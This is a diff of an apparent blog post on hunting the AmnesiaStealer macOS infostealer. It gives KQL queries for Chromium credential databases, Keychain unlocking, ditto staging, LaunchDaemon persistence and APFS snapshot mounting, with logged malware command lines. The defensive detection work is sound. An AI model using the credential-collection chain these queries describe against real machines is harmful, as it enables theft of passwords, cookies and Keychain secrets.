+					<td><code>/Users/jason/Library/Keychains/login.keychain-db</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>This gives us a useful behavioral chain:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">password captured
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">dscl -authonly
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">security unlock-keychain
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">direct login.keychain-db access</span></span></code></pre></div></div>
+<p>Direct Keychain access can occur legitimately through password managers, migration tools and forensic software. The unusual temporary executable and surrounding credential activity make this sequence more significant.</p>
+<hr>
+
+<h3 class="relative group">Chromium Database Access
+    <div id="chromium-database-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#chromium-database-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Chromium-based browsers maintain valuable databases and configuration files such as:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Login Data
+</span></span><span class="line"><span class="cl">Cookies
+</span></span><span class="line"><span class="cl">History
+</span></span><span class="line"><span class="cl">Web Data
+</span></span><span class="line"><span class="cl">Local State</span></span></code></pre></div></div>
+<p><strong>Hunting hypothesis:</strong> Unexpected processes accessing multiple Chromium profile databases may indicate credential, cookie or browser-session collection.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;file&#34; and event.type : &#34;access&#34; and (file.path : *Login\ Data* or file.path : *Cookies* or file.path : *History* or file.path : *Web\ Data* or file.path : *Local\ State*) and not process.executable : &#34;/System/Volumes/Preboot/Cryptexes/Incoming/OS/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.Networking.xpc/Contents/MacOS/com.apple.WebKit.Networking&#34;</code></pre></div>
+<p>The WebKit Networking process above generated legitimate access noise during testing and was excluded.</p>
+<p>In a real environment, additional baselining would likely be needed for legitimate browsers, browser helpers, backup products and security tooling.</p>
+<p>One access to <code>History</code> or <code>Cookies</code> is not necessarily meaningful. Multiple browser databases accessed rapidly by the same unusual process are much more interesting, particularly when followed by staging or archive creation.</p>
+<hr>
+
+<h3 class="relative group">Archive Creation With <code>ditto</code>
+    <div id="archive-creation-with-ditto" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#archive-creation-with-ditto" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>After collecting data, Amnesia used the native <code>ditto</code> utility to create a PKZip archive.</p>
+<p><strong>Hunting hypothesis:</strong> Archive creation using <code>ditto</code> shortly after collection activity may indicate staging for exfiltration.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/ditto&#34; and process.command_line : *-c* and process.command_line : *-k*</code></pre></div>
+
+<h4 class="relative group">Result
+    <div id="result-8" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-8" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+					<th style="text-align: right">process.pid</th>
+					<th style="text-align: right">process.parent.pid</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:51:17.954</td>
+					<td><code>/usr/bin/ditto</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>ditto -c -k --sequesterRsrc /tmp/.com.apple.dt.77002 /tmp/dUvV2FVcZkOrcH80s4nOdw2fL ...</code></td>
+					<td><code>/tmp/.com.apple.dt.77002</code></td>
+					<td style="text-align: right"><code>14710</code></td>
+					<td style="text-align: right"><code>14499</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The Amnesia payload itself is the parent of <code>ditto</code>.</p>
+<p><code>ditto</code> is widely used legitimately on macOS. The useful context here is the sequence of data collection, temporary staging and archive creation.</p>
+<hr>
+
+<h3 class="relative group">LaunchDaemon Persistence
+    <div id="launchdaemon-persistence" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#launchdaemon-persistence" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Amnesia also attempted persistence using a LaunchDaemon.</p>
+<p><strong>Hunting hypothesis:</strong> Unexpected creation of property lists under <code>/Library/LaunchDaemons</code> may indicate persistence, particularly when written by processes outside normal installers or management tooling.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;file&#34; and file.path : /Library/LaunchDaemons/*.plist</code></pre></div>
+<p>LaunchDaemons are widely used by legitimate software, security products and MDM tooling.</p>
+<p>For any result, the important pivots are:</p>
 <ul>
-<li>the process writing the plist;</li>
-<li>its parent process;</li>
-<li>the plist <code>Label</code>;</li>
-<li><code>ProgramArguments</code>;</li>
-<li>whether the target executable lives in <code>/tmp</code>, <code>/private/tmp</code>, Downloads or another user-writable directory;</li>
-<li>and whether <code>launchctl</code> is used immediately afterwards.</li>
+<li>process responsible for creating the plist</li>
+<li><code>Program</code> or <code>ProgramArguments</code></li>
+<li>executable location</li>
+<li>ownership and permissions</li>
+<li>related <code>launchctl</code> activity</li>
+<li>whether the referenced executable resides in a temporary or user-writable location</li>
 </ul>
-<p>A suspicious sequence might look like:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">unknown executable
-</span></span><span class="line"><span class="cl">       ↓
-</span></span><span class="line"><span class="cl">sudo
-</span></span><span class="line"><span class="cl">       ↓
-</span></span><span class="line"><span class="cl">cp &lt;plist&gt; /Library/LaunchDaemons/
-</span></span><span class="line"><span class="cl">       ↓
-</span></span><span class="line"><span class="cl">launchctl bootstrap</span></span></code></pre></div></div>
-<p><strong>Common false positives</strong></p>
-<p>This query can be noisy in managed macOS environments. MDM platforms, EDR agents, VPN software, backup clients, enterprise applications and legitimate installers commonly create LaunchAgents and LaunchDaemons. An allowlist of expected labels, signing identities and installation paths will make this much more useful.</p>
+<p>The earlier investigation established the Amnesia-related LaunchDaemon activity, but no separate result table was captured during this behavioral-hunting pass.</p>
+<hr>
 
-<h3 class="relative group">LaunchDaemon registration with <code>launchctl</code>
-    <div id="launchdaemon-registration-with-launchctl" class="anchor"></div>
+<h3 class="relative group">APFS Snapshot Mounting
+    <div id="apfs-snapshot-mounting" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#launchdaemon-registration-with-launchctl" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#apfs-snapshot-mounting" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">process.name : &#34;launchctl&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;bootstrap&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>Focus on what is being bootstrapped and what spawned <code>launchctl</code>.</p>
-<p>A job loading from:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/Library/LaunchDaemons/</span></span></code></pre></div></div>
-<p>is not suspicious by itself. A job whose <code>ProgramArguments</code> points to a hidden executable under <code>/tmp</code>, especially when <code>launchctl</code> was spawned by that same executable, is much more concerning.</p>
-<p><strong>Common false positives</strong></p>
-<p>Installers, MDM tools, security software and legitimate administration frequently use <code>launchctl bootstrap</code>. The plist contents and process ancestry are essential context.</p>
+<p>The malware also attempted a TCC bypass by mounting an APFS local snapshot.</p>
+<p><strong>Hunting hypothesis:</strong> Unexpected APFS snapshot mounting may indicate attempts to reach protected data through an alternate filesystem view.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs&#34; and process.command_line : *-s*</code></pre></div>
+
+<h4 class="relative group">Result
+    <div id="result-9" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-9" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+					<th style="text-align: right">process.pid</th>
+					<th style="text-align: right">process.parent.pid</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:50:38.837</td>
+					<td><code>/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>mount_apfs -o nobrowse -s com.apple.TimeMachine.2026-08-17-065038.local ...</code></td>
+					<td><code>sudo -S mount_apfs -o nobrowse -s com.apple.TimeMachine.2026...</code></td>
+					<td style="text-align: right"><code>14622</code></td>
+					<td style="text-align: right"><code>14621</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:51:14.227</td>
+					<td><code>/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>mount_apfs -o nobrowse -s com.apple.TimeMachine.2026-08-17-065112.local ...</code></td>
+					<td><code>sudo -S mount_apfs -o nobrowse -s com.apple.TimeMachine.2026...</code></td>
+					<td style="text-align: right"><code>14682</code></td>
+					<td style="text-align: right"><code>14681</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>The <code>...</code> values above reflect where the Kibana view itself truncated the command line.</p>
+<p>Snapshot mounting is not malicious by itself. The suspicious context would be an unexpected process creating or mounting snapshots and subsequently accessing protected browser or user data.</p>
+<p>In this execution, the attempted technique did not establish a successful TCC bypass on macOS 26.</p>
+<hr>
+
+<h3 class="relative group">Hunts That Returned No Results
+    <div id="hunts-that-returned-no-results" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#hunts-that-returned-no-results" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Not every useful hunting hypothesis should return a malicious event.</p>
+<p>Several additional behaviors were tested against the dataset.</p>
+
+<h4 class="relative group">System Audio Muting
+    <div id="system-audio-muting" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#system-audio-muting" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Some macOS stealers have used AppleScript to mute system audio before performing other activity.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/osascript&#34; and process.command_line : *set volume with output muted*</code></pre></div>
+<p><strong>Result: No matching events.</strong></p>
+<hr>
+
+<h4 class="relative group">Telegram <code>tdata</code> Collection
+    <div id="telegram-tdata-collection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#telegram-tdata-collection" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Telegram Desktop data can be valuable to information stealers.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and (process.executable : &#34;/bin/cp&#34; or process.executable : &#34;/bin/cat&#34;) and process.command_line : *tdata*</code></pre></div>
+<p><strong>Result: No matching events.</strong></p>
+<p>This only tests for collection through external utilities such as <code>cp</code> or <code>cat</code>. Direct file access by the malware itself would not necessarily appear in this query.</p>
+<hr>
+
+<h4 class="relative group">AppleScript Credential Prompt
+    <div id="applescript-credential-prompt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#applescript-credential-prompt" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>A common macOS malware technique is to generate fake system-style credential dialogs through AppleScript.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/osascript&#34; and process.command_line : *display dialog*</code></pre></div>
+<p><strong>Result: No matching events.</strong></p>
+<p>Amnesia used a native password prompt in this execution instead, demonstrating why the absence of a particular utility does not prove that the broader behavior did not occur.</p>
+<hr>
+
+<h4 class="relative group">Headless Chromium Session Control
+    <div id="headless-chromium-session-control" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#headless-chromium-session-control" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The stream functionality described for Amnesia can clone a browser profile and launch Chromium headlessly for remote session control.</p>
+<p>A useful behavioral starting point is to look for browsers enabling both headless execution and Chrome DevTools Protocol access:</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.command_line : *--headless* and process.command_line : *--remote-debugging-port*</code></pre></div>
+<p><strong>Result: No matching events.</strong></p>
+<p>A stronger hit would include additional context such as a custom <code>--user-data-dir</code>, a hidden profile directory or an unusual parent process.</p>
+<hr>
+
+<h3 class="relative group">Takeaway
+    <div id="takeaway" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#takeaway" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>The first half of the investigation asked:</p>
+<blockquote><p><strong>I found something suspicious. What did this process do?</strong></p>
+</blockquote><p>PID and PPID pivots were extremely effective for answering that question.</p>
+<p>These hunts start from the opposite direction:</p>
+<blockquote><p><strong>I do not know which process is malicious yet. Which behaviors are worth investigating?</strong></p>
+</blockquote><p>Several of the queries independently rediscovered the same Amnesia activity:</p>
+<ul>
+<li>hidden payload staging under <code>/tmp</code></li>
+<li>quarantine manipulation</li>
+<li>ad-hoc code signing</li>
+<li>host discovery</li>
+<li>Apple Notes collection</li>
+<li>password validation</li>
+<li>Keychain unlocking and direct access</li>
+<li>archive creation</li>
+<li>cleanup</li>
+<li>APFS snapshot mounting</li>
+</ul>
+<p>Other hunts returned legitimate noise or no results at all.</p>
+<p>That is expected.</p>
+<p>Utilities such as <code>curl</code>, <code>xattr</code>, <code>codesign</code>, <code>dscl</code>, <code>security</code>, <code>ditto</code>, <code>system_profiler</code> and <code>mount_apfs</code> are not malicious by themselves.</p>
+<p>The useful signal comes from the combination of <strong>who executed the command, where the parent process came from, what files were targeted, how quickly the events occurred and what happened immediately before and after</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th>Approach</th>
+					<th>Best Used For</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>PID / PPID investigation</td>
+					<td>Reconstructing activity once something suspicious has already been identified</td>
+			</tr>
+			<tr>
+					<td>Behavioral hunting</td>
+					<td>Finding suspicious activity without already knowing which process is malicious</td>
+			</tr>
+	</tbody>
+</table>
+<p>Using both approaches against the same telemetry allowed the infection to be reconstructed while also producing hunting ideas that can be reused against other macOS stealers.</p>
+
+<h3 class="relative group">Takeaway
+    <div id="takeaway-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#takeaway-1" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>The initial investigation asked:</p>
+<blockquote><p><strong>I found something suspicious. What did this process do?</strong></p>
+</blockquote><p>PID and PPID pivots were extremely effective for answering that question.</p>
+<p>The behavioral hunts ask something different:</p>
+<blockquote><p><strong>I do not know which process is malicious yet. Which behaviors are worth investigating?</strong></p>
+</blockquote><p>Several of these hunts independently surfaced the same Amnesia activity: quarantine manipulation, ad-hoc signing, Apple Notes collection, password validation, Keychain access, host discovery, archive creation and temporary-file cleanup.</p>
+<p>Others returned legitimate noise or no results.</p>
+<p>That is expected. Individual macOS utilities such as <code>curl</code>, <code>xattr</code>, <code>codesign</code>, <code>dscl</code>, <code>security</code>, <code>ditto</code> and <code>system_profiler</code> are not malicious. The useful signal comes from <strong>who executed them, where the process originated, what it targeted, when it happened and what occurred immediately before and after</strong>.</p>
+<p>Using both approaches gives us two complementary workflows:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Approach</th>
+					<th>Best Used For</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>PID / PPID investigation</td>
+					<td>Reconstructing activity after something suspicious is already known</td>
+			</tr>
+			<tr>
+					<td>Behavioral hunting</td>
+					<td>Finding suspicious activity without already knowing the malware process</td>
+			</tr>
+	</tbody>
+</table>
+<p>The malware family can change. The behaviors often remain useful.</p>
 
 <h3 class="relative group">Using these as hunts rather than standalone detections
     <div id="using-these-as-hunts-rather-than-standalone-detections" class="anchor"></div>
@@ -3087,47 +3829,6 @@
 </span></span><span class="line"><span class="cl">        ↓
 </span></span><span class="line"><span class="cl">network activity or persistence</span></span></code></pre></div></div>
 <p>That combination is much harder to explain as normal enterprise activity than any single <code>curl</code>, <code>xattr</code>, <code>security</code>, <code>tmutil</code> or <code>launchctl</code> event.</p>
-
-<h2 class="relative group">Takeaways
-    <div id="takeaways" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#takeaways" aria-label="Anchor">#</a>
-    </span>
-    
-</h2>
-<p>The biggest lesson from this hunt was that following PID and PPID relationships was more useful than trying to start with a perfect checklist of AmnesiaStealer techniques.The investigation did not move cleanly from &ldquo;execution&rdquo; to &ldquo;credential access&rdquo; to &ldquo;collection&rdquo; to &ldquo;persistence.&rdquo;</p>
-<p>It looked more like:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">suspicious curl
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">network pivot
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">PID dead end
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">file artifact
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">shared PPID
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">bootstrap reconstructed
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">new payload PID
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">child processes
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">Keychain file events
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">diagnostic artifacts
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">random staging directory
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">snapshot activity
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">archive creation
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">persistence
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">telemetry gap around final upload</span></span></code></pre></div></div>
 <p>That felt much closer to how I actually hunt. Sometimes the first pivot gives you nothing. Sometimes a command looks harmless until you inspect its parent. Sometimes the process telemetry is incomplete, but a surviving file artifact gives you the missing context. And sometimes the EDR shows almost the entire chain but still cannot prove one final step, such as the HTTP upload in this case. The useful part was not finding one obviously malicious command. It was gradually building enough context around otherwise normal-looking activity to understand what the process was really doing.</p>
 <p>For campaign-specific indicators and additional malware analysis, refer to the original <a href="https://www.jamf.com/blog/amnesia-stealer-macos-infostealer-clickfix/"  target="_blank" rel="noreferrer">Jamf Threat Labs research</a>.</p>
 
